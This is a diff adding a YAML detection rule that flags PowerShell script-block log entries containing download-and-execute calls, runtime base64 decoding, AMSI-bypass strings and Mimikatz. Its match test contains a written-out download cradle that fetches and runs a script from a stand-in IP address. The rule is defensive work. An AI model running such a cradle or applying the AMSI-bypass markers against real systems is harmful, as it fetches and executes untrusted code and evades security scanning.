@@ -1,0 +1,41 @@
+id: LNT-006
+title: Suspicious PowerShell script block
+severity: high
+attack: [T1059.001, T1105]
+description: >
+  PowerShell script block logging (event 4104) recorded code that downloads
+  and runs content, decodes base64 at runtime, or tampers with AMSI. Script
+  block logging records the code after it is decoded, so this catches
+  obfuscated scripts that slip past command-line checks.
+detection:
+  script_block:
+    EventID: 4104
+    Channel: Microsoft-Windows-PowerShell/Operational
+  suspicious_content:
+    ScriptBlockText|contains:
+      - DownloadString
+      - DownloadFile
+      - Net.WebClient
+      - Invoke-Expression
+      - 'IEX ('
+      - 'IEX('
+      - FromBase64String
+      - AmsiUtils
+      - amsiInitFailed
+      - Invoke-Mimikatz
+      - '-bxor'
+  condition: script_block and suspicious_content
+fields: [ScriptBlockText, Path]
+falsepositives:
+  - Installer bootstrap scripts that download and run code (Chocolatey, some vendor installers)
+references:
+  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows
+tests:
+  match:
+    - EventID: 4104
+      Channel: Microsoft-Windows-PowerShell/Operational
+      ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')
+  nomatch:
+    - EventID: 4104
+      Channel: Microsoft-Windows-PowerShell/Operational
+      ScriptBlockText: Get-ChildItem -Path C:\Reports -Filter *.csv | Measure-Object
